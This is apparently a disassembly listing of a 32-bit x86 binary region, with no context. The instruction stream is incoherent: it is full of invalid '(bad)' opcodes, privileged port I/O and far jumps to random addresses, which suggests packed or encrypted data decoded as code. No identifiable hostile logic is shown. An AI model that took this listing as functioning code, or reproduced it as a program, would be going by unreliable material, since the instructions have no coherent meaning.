  410f49:	nop    DWORD PTR [ebx+0x6f]
  410f4d:	or     edx,DWORD PTR [ecx-0x64]
  410f50:	mov    edi,0xd15619aa
  410f55:	hlt    
  410f56:	fisubr WORD PTR [esi-0x6f]
  410f59:	xlat   BYTE PTR ds:[ebx]
  410f5a:	repz pop edi
  410f5c:	jbe    0x410f8a
  410f5e:	mov    cl,0xf7
  410f60:	jmp    0x10533493
  410f65:	jge    0x410f34
  410f67:	aad    0x1f
  410f69:	inc    eax
  410f6a:	ds loop 0x410f8d
  410f6d:	jae    0x410fdf
  410f6f:	inc    ebp
  410f70:	aas    
  410f71:	sti    
  410f72:	or     ecx,0xa2e3fb11
  410f78:	test   BYTE PTR [esi+edi*2-0x11],bh
  410f7c:	push   ebx
  410f7d:	jmp    0x258de9c6
  410f82:	dec    eax
  410f83:	aas    
  410f84:	add    eax,eax
  410f86:	pushf  
  410f87:	mov    dh,cl
  410f89:	mov    esi,0x32c1db45
  410f8e:	pop    ss
  410f8f:	jle    0x410fb6
  410f91:	cmp    al,0x4c
  410f93:	add    eax,0x82babb94
  410f98:	mov    eax,0xb6293192
  410f9d:	mov    dh,BYTE PTR [eax]
  410f9f:	or     bh,BYTE PTR [ebp-0x4b2e1b86]
  410fa5:	ins    BYTE PTR es:[edi],dx
  410fa6:	pop    esp
  410fa7:	bound  ebx,QWORD PTR [eax+0x60ffdd75]
  410fad:	ds cwde 
  410faf:	repnz push 0x3e
  410fb2:	sbb    al,0x90
  410fb4:	call   0x1eb97f76
  410fb9:	jmp    0xdd42de93
  410fbe:	out    0xbe,eax
  410fc0:	lods   al,BYTE PTR ds:[esi]
  410fc1:	xor    DWORD PTR [edx+esi*1],edx
  410fc4:	lods   eax,DWORD PTR ds:[esi]
  410fc5:	xor    al,0x71
  410fc7:	and    dh,ah
  410fc9:	adc    al,0x3a
  410fcb:	push   esp
  410fcc:	jae    0x410fa1
  410fce:	stos   DWORD PTR es:[edi],eax
  410fcf:	xchg   esp,eax
  410fd0:	fild   WORD PTR [ebp+0x61]
  410fd3:	cmp    DWORD PTR [edx+0x8],0x5a
  410fd7:	in     eax,0x62
  410fd9:	dec    ebx
  410fda:	mul    BYTE PTR [ebx+0x70]
  410fdd:	fmul   QWORD PTR [ebp+0x36]
  410fe0:	xor    BYTE PTR [edi+0x6ba9959a],0x47
  410fe7:	outs   dx,DWORD PTR ds:[esi]
  410fe8:	ja     0x410f7c
  410fea:	sub    eax,0xf483aed3
  410fef:	cdq    
  410ff0:	aas    
  410ff1:	fstp   DWORD PTR [ebx]
  410ff3:	stos   DWORD PTR es:[edi],eax
  410ff4:	cdq    
  410ff5:	mov    DWORD PTR [esi-0x36],edi
  410ff8:	clc    
  410ff9:	xchg   edi,edi
  410ffb:	mov    cl,0xe8
  410ffd:	pushf  
  410ffe:	jb     0x41105f
  411000:	mov    ds:0x91f536ec,eax
  411005:	jg     0x41103e
  411007:	and    bl,BYTE PTR [eax+0x2cb48298]
  41100d:	fistp  WORD PTR [ebx]
  41100f:	xor    esp,DWORD PTR [edx]
  411011:	xor    DWORD PTR [eax+eax*8],edx
  411014:	sar    DWORD PTR [esi+0x16a83516],1
  41101a:	mov    ecx,0x76e831d2
  41101f:	cwde   
  411020:	jnp    0x410fde
  411022:	popa   
  411023:	in     al,dx
  411024:	stos   BYTE PTR es:[edi],al
  411025:	scas   al,BYTE PTR es:[edi]
  411026:	pusha  
  411027:	sbb    ah,BYTE PTR ds:0x7b7f1418
  41102d:	jg     0x41101a
  41102f:	(bad)  
  411031:	sbb    eax,0xc5562e02
  411036:	test   BYTE PTR [ecx+0x23f6a1b5],ch
  41103c:	fucomp st(5)
  41103e:	imul   esp,DWORD PTR [edx-0x4e32d1cd],0xffffff98
  411045:	test   cl,ch
  411047:	pop    es
  411048:	jne    0x41105d
  41104a:	hlt    
  41104b:	retf   
  41104c:	out    0x24,eax
  41104e:	dec    BYTE PTR [ebp+0x57]
  411051:	aas    
  411052:	push   0x12
  411054:	or     al,0x74
  411056:	mov    cl,0xa1
  411058:	rol    al,0x53
  41105b:	xor    DWORD PTR [si-0x2c],ecx
  41105f:	sbb    dl,dl
  411061:	out    0x29,eax
  411063:	and    cl,BYTE PTR [ebx]
  411065:	dec    esp
  411066:	int3   
  411067:	jne    0x41107b
  411069:	iret   
  41106a:	ret    
  41106b:	sub    DWORD PTR [eax],edx
  41106d:	fwait
  41106e:	repz mov esi,es
  411071:	int    0x58
  411073:	(bad)  
  411074:	pop    esp
  411075:	gs nop
  411077:	jp     0x411018
  411079:	and    DWORD PTR [eax],edi
  41107b:	imul   ebx,DWORD PTR [ebp-0x4a111e3e],0xf1dd0369
  411085:	test   al,0x37
  411087:	(bad)  
  411089:	(bad)  
  41108a:	xor    bh,BYTE PTR [edx-0x5d3af536]
  411090:	out    dx,al
  411091:	jmp    0x70f5:0xe3b532b0
  411098:	repz xchg ecx,eax
  41109a:	lds    esp,FWORD PTR ds:0xee168741
  4110a0:	sub    eax,0xc28eb50d
  4110a5:	pop    edx
  4110a6:	sbb    eax,0x47666645
  4110ab:	(bad)  
  4110ac:	sbb    DWORD PTR [ecx],edi
  4110ae:	mov    ds:0x9b27c3de,al
  4110b3:	pop    edi
  4110b4:	push   edx
  4110b5:	mov    DWORD PTR [edx+0x389ebb8d],edx
  4110bb:	mov    ?,WORD PTR [edi+0x62942fdf]
  4110c1:	or     al,0x2c
  4110c3:	add    dl,BYTE PTR [ebp-0x5446d524]
  4110c9:	push   ds
  4110ca:	or     edx,eax
  4110cc:	sahf   
  4110cd:	gs push ebp
  4110cf:	in     al,dx
  4110d0:	jo     0x41112d
  4110d2:	add    eax,0x63acdca2
  4110d7:	daa    
  4110d8:	sub    al,0xd8
  4110da:	jmp    0x4cd2:0xca5cc417
  4110e1:	loope  0x4110a2
  4110e3:	retf   
  4110e4:	mov    ds:0x9fc9e38b,eax
  4110e9:	dec    eax
  4110ea:	fstp   DWORD PTR [edi+0x4b]
  4110ed:	ins    DWORD PTR es:[edi],dx
  4110ee:	call   0xeb8c:0xc31f1aae
  4110f5:	pop    edx
  4110f6:	cwde   
  4110f7:	ss mov cl,0xf9
  4110fa:	mov    dh,0xde
  4110fc:	pop    edi
  4110fd:	mov    edi,0x3d8eb20
  411102:	call   0x95172a21
  411107:	mov    dh,0x8b
  411109:	pop    DWORD PTR [esi-0xa]
  41110c:	mov    dh,0x1c
  41110e:	push   ebx
  41110f:	in     eax,dx
  411110:	push   ds
  411111:	xchg   esp,eax
  411112:	push   eax
  411113:	shl    DWORD PTR [ebx+0x73],0x46
  411117:	int3   
  411118:	ret    
  411119:	inc    esp
  41111a:	inc    edi
  41111b:	loopne 0x4110f9
  41111d:	leave  
  41111e:	daa    
  41111f:	cmp    al,BYTE PTR [esi-0x35]
  411122:	and    DWORD PTR [eax+ebp*8+0x657f7718],ebp
  411129:	xchg   esp,eax
  41112a:	cdq    
  41112b:	sti    
  41112c:	xor    BYTE PTR [ebx+eiz*4+0x55],dl
  411130:	xchg   ecx,eax
  411132:	or     al,0xfd
  411134:	inc    edi
  411135:	inc    eax
  411136:	or     bl,BYTE PTR [edx-0x7d982177]
  41113c:	addr16 push ebp
  41113e:	(bad)  
  411140:	mov    ds:0x37f9c44b,al
  411145:	push   es
  411146:	push   ebp
  411147:	jno    0x41110a
  411149:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41114a:	ret    0xe9c6
  41114d:	fs cdq 
  41114f:	add    eax,0x13
  411152:	call   0xf2e57586
  411157:	test   eax,0x6220390e
  41115c:	sub    ebp,ecx
  41115e:	sub    ah,BYTE PTR [ebp-0x7c]
  411161:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411162:	mov    dh,0x5
  411164:	xor    dl,cl
  411166:	test   al,0x38
  411168:	xlat   BYTE PTR ds:[ebx]
  411169:	adc    eax,0x51db572d
  41116e:	adc    al,0xa6
  411170:	add    DWORD PTR [eax+0x16],0x86b2ef70
  411177:	test   DWORD PTR [ecx+edx*2],esp
  41117a:	pop    ecx
  41117b:	mov    eax,ds:0xf6a1284
  411180:	xchg   BYTE PTR [edi],cl
  411182:	mov    edi,ebp
  411184:	or     al,0xaa
  411186:	test   al,0x8e
  411188:	clc    
  411189:	cmc    
  41118a:	data16 jmp 0x4111df
  41118d:	scas   eax,DWORD PTR es:[edi]
  41118e:	hlt    
  41118f:	mov    ebp,eax
  411191:	xor    DWORD PTR [ebp-0x24dffeed],eax
  411197:	jno    0x4111ac
  411199:	xchg   DWORD PTR [ebp-0x14],edi
  41119c:	pop    eax
  41119d:	pushaw 
  41119f:	fld    DWORD PTR [eax+0x6d0f0672]
  4111a5:	fdivp  st(1),st
  4111a7:	inc    ecx
  4111a8:	add    eax,0x40ce075
  4111ad:	retf   0xce7f
  4111b0:	and    eax,0xf3e9b3de
  4111b6:	adc    BYTE PTR ds:0xef096951,bh
  4111bc:	ds jl  0x411151
  4111bf:	xchg   edx,eax
  4111c0:	neg    BYTE PTR es:[ebp-0x2f]
  4111c4:	daa    
  4111c5:	test   DWORD PTR [edi-0x3],ecx
  4111c8:	dec    edx
  4111c9:	scas   al,BYTE PTR es:[edi]
  4111ca:	mov    ecx,0xdfdff9ac
  4111d0:	xchg   edx,eax
  4111d1:	inc    ebp
  4111d2:	call   0xa2fb:0xa893a777
  4111d9:	stos   DWORD PTR es:[edi],eax
  4111da:	out    0x31,al
  4111dc:	jno    0x4111c0
  4111de:	dec    edi
  4111df:	jg     0x411182
  4111e1:	sub    al,0xd5
  4111e3:	push   0x5a
  4111e5:	or     dl,BYTE PTR [esi+edx*4+0x660f624f]
  4111ec:	inc    esi
  4111ed:	sub    BYTE PTR [edx],al
  4111ef:	lea    ecx,[edx+0x6b]
  4111f2:	out    dx,al
  4111f3:	jmp    0xad2b2d8f
  4111f8:	(bad)  [edi]
  4111fa:	fiadd  DWORD PTR [edi]
  4111fc:	jge    0x411234
  4111fe:	nop    DWORD PTR [ecx-0x427a6322]
  411205:	push   cs
  411206:	iret   
  411207:	mov    eax,ebp
  411209:	pop    edi
  41120a:	jge    0x4111c6
  41120c:	(bad)  
  41120e:	sbb    BYTE PTR [eax-0x4a],ah
  411211:	scas   eax,DWORD PTR es:[edi]
  411212:	sbb    ah,BYTE PTR [ecx+0x6e]
  411215:	mov    BYTE PTR [edx],dl
  411217:	xor    al,0x9a
  411219:	dec    eax
  41121a:	jle    0x4111b5
  41121c:	cs daa 
  41121e:	(bad)  
  41121f:	push   esi
  411220:	loopne 0x4111dc
  411222:	sub    eax,0xa56eb252
  411227:	jecxz  0x411277
  411229:	add    bl,BYTE PTR [eax-0x17]
  41122c:	pop    esp
  41122d:	add    edi,DWORD PTR [edi-0x7c6d0488]
  411233:	sub    al,bl
  411235:	jge    0x411276
  411237:	add    ebx,esi
  411239:	(bad)  
  41123b:	sahf   
  41123c:	or     BYTE PTR [ebx-0x31ad0749],al
  411242:	inc    esi
  411243:	rcr    BYTE PTR [edi+0x1a],cl
  411246:	ins    DWORD PTR es:[edi],dx
  411247:	pop    esi
  411248:	sahf   
  411249:	mov    bh,0x9e
  41124b:	sar    ecx,1
  41124d:	imul   edx,DWORD PTR [eax],0x39
  411250:	mov    cl,0x8b
  411252:	ins    BYTE PTR es:[edi],dx
  411253:	dec    esi
  411254:	add    al,0xd4
  411256:	(bad)  
  411257:	pop    ss
  411258:	adc    ebp,esi
  41125a:	cmc    
  41125b:	ds push eax
  41125d:	add    BYTE PTR [edx],dh
  41125f:	add    BYTE PTR [ecx-0x3700e54d],dh
  411265:	ins    BYTE PTR es:[edi],dx
  411266:	mov    ch,0x49
  411268:	sub    DWORD PTR ds:0x41eff0d7,0xffffffde
  41126f:	cmp    eax,0x96a9512a
  411274:	pop    ss
  411275:	stos   DWORD PTR es:[edi],eax
  411276:	out    0x9b,eax
  411278:	pop    DWORD PTR [edi]
  41127a:	dec    ebx
  41127b:	push   edx
  41127c:	test   BYTE PTR [ebp+0x1b],cl
  41127f:	cdq    
  411280:	push   0x313e0218
  411285:	push   edi
  411286:	mov    eax,DWORD PTR [eax+0x0]
  411289:	add    eax,0xee9aad8
  41128e:	mov    ecx,0xe75ce676
  411293:	mov    dh,0xce
  411295:	rcl    ebx,1
  411297:	push   esi
  411298:	pop    ds
  411299:	jmp    0x4112e7
  41129b:	xchg   BYTE PTR [edi],al
  41129d:	faddp  st(2),st
  41129f:	int    0xde
  4112a1:	mov    ah,0xf
  4112a3:	mov    ebp,0x59832163
  4112a8:	rcl    BYTE PTR [ebp+0x4d],0x1b
  4112ac:	aad    0x30
  4112ae:	pop    ebp
  4112af:	cdq    
  4112b0:	sub    dl,BYTE PTR [edx]
  4112b2:	rcl    BYTE PTR [ebp+0x36fb6035],cl
  4112b8:	test   ebx,esi
  4112ba:	pusha  
  4112bb:	bound  esi,QWORD PTR [ebp+0x512e2a20]
  4112c1:	or     eax,0x7bc07630
  4112c6:	inc    ebp
  4112c7:	(bad)  
  4112c8:	push   ebp
  4112c9:	pop    ss
  4112ca:	gs es scas al,BYTE PTR es:[edi]
  4112cd:	(bad)  
  4112ce:	mov    esi,0xb69169f0
  4112d3:	dec    BYTE PTR [ebx+0x410e039e]
  4112d9:	add    eax,0x8ab8a0e2
  4112de:	mov    al,BYTE PTR [ecx-0x6d]
  4112e1:	adc    DWORD PTR [edi+esi*8+0x28a04729],edx
  4112e8:	jb     0x411338
  4112ea:	cmp    eax,0x3d064d57
  4112ef:	inc    eax
  4112f0:	adc    DWORD PTR ds:0x36674312,edi
  4112f6:	aaa    
  4112f7:	retf   
  4112f8:	sbb    edx,esi
  4112fa:	push   edi
  4112fb:	stc    
  4112fc:	xchg   DWORD PTR [eax-0x7d],edi
  4112ff:	or     edx,DWORD PTR [eax]
  411301:	test   ah,0x5b
  411304:	dec    eax
  411305:	cwde   
  411306:	inc    esp
  411307:	inc    edi
  411308:	jb     0x41137b
  41130a:	xchg   ebx,eax
  41130b:	out    dx,al
  41130c:	(bad)  
  41130d:	fldcw  WORD PTR [edx-0x44]
  411310:	add    DWORD PTR [edi],eax
  411312:	sbb    eax,0xddc3c166
  411317:	shl    BYTE PTR [ecx],0x15
  41131a:	pop    edi
  41131b:	dec    edi
  41131c:	xchg   BYTE PTR [ebx],dh
  41131e:	jno    0x4112a4
  411320:	or     BYTE PTR [edi],dl
  411322:	iret   
  411323:	push   0xffffff8a
  411325:	dec    dx
  411327:	jnp    0x4112c8
  411329:	shr    DWORD PTR [edx-0x1b],1
  41132c:	cs mov esi,0x723ba093
  411332:	jg     0x411388
  411334:	mov    WORD PTR [edi-0x69585e21],ss
  41133a:	js     0x4112d8
  41133c:	loope  0x41132e
  41133e:	sbb    BYTE PTR [eax+eax*2-0x51],bl
  411342:	mov    dh,0xd1
  411344:	or     DWORD PTR [esi],0xffffff93
  411347:	inc    eax
  411348:	xchg   al,bh
  41134a:	mov    ch,0xf6
  41134c:	cwde   
  41134d:	mov    bl,0x3c
  41134f:	stos   DWORD PTR es:[edi],eax
  411350:	and    al,0x1e
  411352:	loopne 0x41135a
  411354:	inc    ebp
  411355:	push   ss
  411356:	push   esp
  411357:	sub    DWORD PTR [eax+0x7258a5ae],eax
  41135d:	ins    DWORD PTR es:[edi],dx
  41135e:	jmp    0x44819ed5
  411363:	repnz sahf 
  411365:	push   cs
  411366:	xchg   edi,eax
  411367:	mov    ds:0x9a3ec4aa,eax
  41136c:	bound  ebx,QWORD PTR [ebx+0x7]
  41136f:	lods   eax,DWORD PTR ds:[esi]
  411370:	or     DWORD PTR [esi],ebp
  411372:	fadd   DWORD PTR [ebp-0x30]
  411375:	xor    eax,0x4c02303f
  41137a:	pop    edx
  41137b:	jo     0x411382
  41137d:	add    DWORD PTR [edx+eiz*2-0x5227d5fd],esi
  411384:	inc    ebp
  411385:	mov    dl,0xe8
  411387:	xchg   ebx,eax
  411388:	cmp    BYTE PTR [esi+0x762e8d3e],dh
  41138e:	popa   
  41138f:	xchg   ebx,eax
  411390:	test   eax,0xb833652e
  411395:	and    al,0x83
  411397:	pop    eax
  411398:	cdq    
  411399:	sti    
  41139a:	mov    ah,0x2f
  41139c:	fnstcw WORD PTR [edx-0x74]
  41139f:	inc    eax
  4113a0:	mov    BYTE PTR [edi+0xc882648],ch
  4113a6:	pop    eax
  4113a7:	mov    ds:0xa6ab327b,al
  4113ac:	push   es
  4113ad:	adc    cl,BYTE PTR [ecx-0x16]
  4113b0:	sub    cl,cl
  4113b2:	push   eax
  4113b3:	and    BYTE PTR [ebp-0x55a37730],bl
  4113b9:	jmp    0x4113a4
  4113bb:	mov    bh,0x90
  4113bd:	lea    edx,[edi+0x293543b0]
  4113c3:	push   ecx
  4113c4:	add    eax,0xe84d1cd5
  4113c9:	aad    0x26
  4113cb:	jmp    0x14fd5eef
  4113d0:	mov    ah,0xca
  4113d2:	mov    ah,0xb8
  4113d4:	sub    BYTE PTR ds:0x5c716bea,al
  4113da:	add    eax,0x4bbe63d6
  4113df:	sar    DWORD PTR [edi+0x21],0xbd
  4113e3:	icebp  
  4113e4:	lods   al,BYTE PTR ds:[esi]
  4113e5:	cmp    al,0xbd
  4113e7:	sub    eax,DWORD PTR [ebx-0x332f2b71]
  4113ed:	shr    cl,0xff
  4113f0:	sub    al,0x50
  4113f2:	dec    edx
  4113f3:	add    BYTE PTR [esi-0x70],0x95
  4113f7:	sub    al,0xbd
  4113f9:	mov    al,ds:0x69097d34
  4113fe:	sahf   
  4113ff:	(bad)  
  411400:	(bad)  
  411401:	mov    esp,0x2edcab0
  411406:	dec    esi
  411407:	clc    
  411408:	xor    cl,BYTE PTR [ebp+0x60]
  41140b:	push   es
  41140c:	cmp    eax,0xe9876148
  411411:	pop    eax
  411412:	jbe    0x411438
  411414:	push   0x1b
  411416:	mov    bl,0x42
  411418:	mov    cl,0xf5
  41141a:	mov    ecx,0x5127287f
  41141f:	leave  
  411420:	in     al,dx
  411421:	cli    
  411422:	jno    0x4113bc
  411424:	xor    al,BYTE PTR [ecx+0x6c]
  411427:	nop
  411428:	push   0xb0db701
  41142d:	jle    0x41143a
  41142f:	jno    0x4113dd
  411431:	iret   
  411432:	pop    ebp
  411433:	daa    
  411434:	cwde   
  411435:	mov    ds:0xd9c36696,al
  41143a:	xor    al,BYTE PTR [esi]
  41143c:	fsubr  QWORD PTR [edx+ecx*8+0xc4b25e5]
  411443:	push   es
  411444:	loopne 0x4113f9
  411446:	aam    0x69
  411448:	cmp    DWORD PTR [edx-0x6b5de20e],eax
  41144e:	pop    esp
  41144f:	test   DWORD PTR [esi+0x18c0fde],0x87915f3a
  411459:	loopne 0x411441
  41145b:	and    DWORD PTR [eax+ecx*4-0x5ff7a1d6],0x5a
  411463:	sub    BYTE PTR [edi+ebp*4+0x30155e6c],ch
  41146a:	(bad)  
  41146b:	and    ebx,DWORD PTR [ecx+eax*8-0x5b]
  41146f:	push   eax
  411470:	into   
  411471:	xchg   eax,esi
  411473:	push   0xffffffa6
  411475:	jecxz  0x4114ee
  411477:	imul   ebx,DWORD PTR [esi],0x55ca11fb
  41147d:	cmp    ebp,DWORD PTR [edx]
  41147f:	inc    edi
  411480:	mov    edi,0x5389a974
  411485:	sbb    esi,DWORD PTR [edx]
  411487:	daa    
  411488:	cmc    
  411489:	jne    0x4114cc
  41148b:	fimul  DWORD PTR [esi-0x44]
  41148e:	cli    
  41148f:	add    ch,dh
  411491:	ret    0x3959
  411494:	ins    BYTE PTR es:[edi],dx
  411495:	adc    ebx,DWORD PTR [ebx+0x1ce7b869]
  41149b:	and    eax,0x71226376
  4114a0:	xchg   DWORD PTR [edx],ebx
  4114a2:	ret    
  4114a3:	adc    eax,0x352f87b9
  4114a8:	mov    BYTE PTR [edx+ebx*2-0x22],ch
  4114ac:	gs xchg ecx,eax
  4114ae:	xchg   DWORD PTR [ebx+0x4f],edi
  4114b1:	mov    edx,0xa6868afb
  4114b6:	jo     0x4114b8
  4114b8:	inc    ecx
  4114b9:	jge    0x4114cd
  4114bb:	push   ebp
  4114bc:	xchg   edx,eax
  4114bd:	arpl   WORD PTR [eax],bp
  4114bf:	push   0x5c3aed05
  4114c4:	dec    ebx
  4114c5:	clc    
  4114c6:	add    al,0xfa
  4114c8:	sub    DWORD PTR [bx],eax
  4114cb:	sbb    ch,BYTE PTR [ebx-0x67]
  4114ce:	jp     0x411457
  4114d0:	int3   
  4114d1:	iret   
  4114d2:	in     eax,dx
  4114d3:	pop    ebx
  4114d4:	repz or BYTE PTR ds:0x19aa7c28,ah
  4114db:	(bad)  
  4114dc:	xor    eax,0xd3e5d9fe
  4114e1:	pop    ecx
  4114e2:	push   edi
  4114e3:	mov    esp,0xee8c77f5
  4114e8:	jnp    0x41146e
  4114ea:	xor    ah,BYTE PTR [esi]
  4114ec:	lods   al,BYTE PTR ds:[esi]
  4114ed:	pop    eax
  4114ee:	mov    ebx,gs
  4114f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114f1:	fs out dx,eax
  4114f3:	aas    
  4114f4:	stos   DWORD PTR es:[edi],eax
  4114f5:	or     DWORD PTR [ebx-0x348e3c64],0xbfa3f684
  4114ff:	scas   al,BYTE PTR es:[edi]
  411500:	pop    edx
  411501:	aaa    
  411502:	push   ds
  411503:	nop
  411504:	scas   eax,DWORD PTR es:[edi]
  411505:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411506:	xor    al,0x3b
  411508:	sbb    esp,ebx
  41150a:	xchg   ebp,eax
  41150b:	retf   
  41150c:	jb     0x411523
  41150e:	adc    eax,0x2fbedc01
  411514:	dec    esp
  411515:	retf   
  411516:	aas    
  411517:	sti    
  411518:	into   
  411519:	inc    ebp
  41151a:	shr    BYTE PTR [ecx+0x7],1
  41151d:	inc    ebp
  41151e:	and    BYTE PTR [edx+0x7],cl
  411521:	mov    eax,0x32cec4f0
  411526:	shl    BYTE PTR [ebx+0x2ba16287],cl
  41152c:	jmp    FWORD PTR [ecx-0x1d1a8839]
  411532:	adc    BYTE PTR [eax],cl
  411534:	into   
  411535:	add    esp,ebp
  411537:	loop   0x4114df
  411539:	push   0x86e3c1a2
  41153e:	add    DWORD PTR [ecx-0x4b155c0d],ebx
  411544:	xchg   ebp,eax
  411545:	ficom  DWORD PTR [eax-0x56b2c4cf]
  41154b:	push   ebp
  41154c:	and    eax,0xd7335197
  411551:	mov    esi,ebx
  411553:	mov    ds:0xd023564f,al
  411558:	loopne 0x4115d5
  41155a:	xlat   BYTE PTR ds:[ebx]
  41155b:	mov    dh,0x94
  41155d:	shl    BYTE PTR [edi+0x5f],0x76
  411561:	mov    edi,0x277e4637
  411566:	dec    edx
  411567:	repz int3 
  411569:	ret    
  41156a:	enter  0x63b,0x49
  41156e:	mov    bh,0x5d
  411570:	dec    ecx
  411571:	or     DWORD PTR [esi+0x32],edx
  411574:	test   dl,dl
  411576:	and    al,0x99
  411578:	sbb    al,0x4e
  41157a:	adc    ebx,DWORD PTR [edx-0x7d10c5b1]
  411580:	into   
  411581:	jno    0x411560
  411583:	les    edx,FWORD PTR [ecx+0x26]
  411586:	enter  0x15df,0xb
  41158a:	lock and ebp,DWORD PTR [edx]
  41158d:	retf   0xd02e
  411590:	jbe    0x411552
  411592:	cmp    BYTE PTR [eax],al
  411594:	enter  0xfc55,0xe7
  411598:	daa    
  411599:	nop
  41159a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41159b:	pop    ebx
  41159c:	fbstp  TBYTE PTR [ebx+0x61861ec8]
  4115a2:	and    ebx,ebx
  4115a4:	and    al,0x14
  4115a6:	xlat   BYTE PTR ds:[ebx]
  4115a7:	xor    DWORD PTR [esi+0x77706c7e],0xffffff89
  4115ae:	xor    BYTE PTR [esi-0x503a2b5b],bl
  4115b4:	stc    
  4115b5:	jg     0x411569
  4115b7:	sbb    ch,bl
  4115b9:	xchg   ebx,ebx
  4115bb:	and    BYTE PTR [edx-0x2cdb99c1],0x4a
  4115c2:	mov    dh,0xf0
  4115c4:	ss jle 0x411601
  4115c7:	aad    0x92
  4115c9:	xchg   edi,eax
  4115ca:	mov    al,gs:0xc99b5510
  4115d0:	push   ss
  4115d1:	ror    DWORD PTR [edx+0x2288d1fe],1
  4115d7:	pop    es
  4115d8:	jle    0x4115b3
  4115da:	add    al,bh
  4115dc:	lea    ecx,[ecx]
  4115de:	(bad)  
  4115e0:	dec    esp
  4115e1:	jmp    0x4115c3
  4115e3:	fdivr  DWORD PTR [edx-0x55]
  4115e6:	xor    eax,0x3e416c38
  4115eb:	shl    ebx,cl
  4115ed:	lods   eax,DWORD PTR ds:[esi]
  4115ee:	scas   eax,DWORD PTR es:[edi]
  4115ef:	(bad)  
  4115f0:	fnsave [eax-0x6350a183]
  4115f6:	(bad)  
  4115f7:	(bad)  [edi-0x5bfb784]
  4115fd:	out    dx,eax
  4115fe:	arpl   WORD PTR [ecx],ax
  411600:	dec    ecx
  411601:	leave  
  411602:	mov    esi,0x56856919
  411607:	jl     0x41160b
  411609:	pop    ebp
  41160a:	cmp    bh,ch
  41160c:	jl     0x41160a
  41160e:	je     0x4115f5
  411610:	mov    ebx,0x51fb2171
  411615:	push   ebx
  411616:	mov    cl,BYTE PTR [ecx+edx*4]
  411619:	cwde   
  41161a:	es inc ebx
  41161c:	cmp    DWORD PTR [esp+edi*8+0x5b],esp
  411620:	sahf   
  411621:	jge    0x411613
  411623:	cli    
  411624:	xchg   edx,eax
  411625:	scas   al,BYTE PTR es:[edi]
  411626:	cmp    al,0xc5
  411628:	push   ss
  411629:	sub    bh,al
  41162b:	daa    
  41162c:	xchg   ebp,eax
  41162d:	mov    ebp,0x853cd797
  411632:	rcl    DWORD PTR [ebp-0x6c335b5],cl
  411638:	retf   
  411639:	jle    0x98b621cd
  41163f:	adc    BYTE PTR [edx-0x7f12178b],0x2a
  411646:	cmp    eax,0x43a314c7
  41164b:	mov    ecx,edi
  41164d:	add    BYTE PTR [eax-0x18262613],cl
  411653:	aaa    
  411654:	fnstcw WORD PTR [edi+0x1b]
  411657:	add    al,0xb8
  411659:	adc    eax,ebx
  41165b:	jae    0x411670
  41165d:	ins    DWORD PTR es:[edi],dx
  41165e:	or     ebx,ebp
  411660:	jo     0x411610
  411662:	mov    edi,0xb55b3145
  411667:	dec    esp
  411668:	sbb    ebp,eax
  41166a:	dec    eax
  41166b:	mov    ebx,0x4a5f5419
  411670:	dec    ebp
  411671:	in     eax,dx
  411672:	int3   
  411673:	hlt    
  411674:	enter  0xb28d,0x14
  411678:	cmp    eax,DWORD PTR [edx]
  41167a:	aaa    
  41167b:	xchg   ebx,eax
  41167c:	adc    ecx,DWORD PTR [edi+0x2629f08d]
  411682:	rol    dh,1
  411684:	retf   0x4e4
  411687:	jmp    0x41165a
  411689:	push   0x7d
  41168b:	ja     0x4116cd
  41168d:	sub    al,0xa1
  41168f:	es inc ebp
  411691:	cmp    ch,dh
  411693:	outs   dx,BYTE PTR ds:[esi]
  411694:	mov    edx,0xde9d01b
  411699:	imul   DWORD PTR [esi+ebx*2+0x1432e9d4]
  4116a0:	retf   
  4116a1:	xchg   ebx,eax
  4116a2:	mov    ecx,DWORD PTR [edi-0xf]
  4116a5:	sbb    eax,0xbc5534e6
  4116aa:	xor    al,0x98
  4116ac:	dec    eax
  4116ad:	adc    BYTE PTR [ebx-0x77d72051],al
  4116b3:	add    al,0xf0
  4116b5:	jno    0x411707
  4116b7:	pop    es
  4116b8:	aas    
  4116b9:	in     eax,dx
  4116ba:	jp     0x411718
  4116bc:	ins    BYTE PTR es:[edi],dx
  4116bd:	lds    edx,FWORD PTR [ebx-0x34]
  4116c0:	loopne 0x41164b
  4116c2:	std    
  4116c3:	pop    es
  4116c4:	and    DWORD PTR ds:0x927b1a5c,esp
  4116ca:	push   0x18
  4116cc:	nop
  4116cd:	xchg   DWORD PTR [edx+0x3170c8b5],esi
  4116d3:	ret    
  4116d4:	cwde   
  4116d5:	mov    edi,0x30e32db9
  4116da:	test   al,0x1f
  4116dc:	pusha  
  4116dd:	jb     0x411753
  4116df:	bound  esi,QWORD PTR [ecx+0x14650f9d]
  4116e5:	stos   DWORD PTR es:[edi],eax
  4116e6:	dec    edx
  4116e7:	pop    es
  4116e8:	fisub  WORD PTR [eax+0x4d]
  4116eb:	fs fwait
  4116ed:	and    cl,BYTE PTR [ebx-0x4d85ae8c]
  4116f3:	por    mm2,QWORD PTR [eax]
  4116f6:	pop    eax
  4116f7:	pop    esi
  4116f8:	dec    esi
  4116f9:	or     edx,edi
  4116fb:	xchg   ecx,eax
  4116fc:	push   0xffffffa7
  4116fe:	sbb    dh,dl
  411700:	les    ebp,FWORD PTR [ebx+0x1c633f8b]
  411706:	inc    eax
  411707:	cmp    ebx,0x8b11c348
  41170d:	cwde   
  41170e:	loope  0x4116eb
  411710:	mov    edi,0xcc17e88e
  411715:	rcl    esp,cl
  411717:	inc    ebx
  411718:	ins    BYTE PTR es:[edi],dx
  411719:	xor    eax,0x781b3d6f
  41171e:	jmp    0x411715
  411720:	imul   edi,eax,0xfffffff7
  411723:	inc    esp
  411724:	add    eax,0x6774b74e
  411729:	out    0x74,eax
  41172b:	add    bl,BYTE PTR [ebx-0xc4019a1]
  411731:	or     DWORD PTR [edx+0x1b8a98f1],0x9b4bb652
  41173b:	or     eax,0xaa686fef
  411740:	leave  
  411741:	adc    eax,0x28ff9348
  411746:	pop    ss
  411747:	ins    BYTE PTR es:[edi],dx
  411748:	or     dh,BYTE PTR [edx-0x2b0df07e]
  41174e:	cmp    DWORD PTR [eax],esp
  411750:	ror    cl,1
  411752:	sub    al,0x80
  411754:	in     eax,dx
  411755:	and    al,0x84
  411757:	paddsw mm3,QWORD PTR [eax]
  41175a:	pop    DWORD PTR ds:[eax+0x2ee16d00]
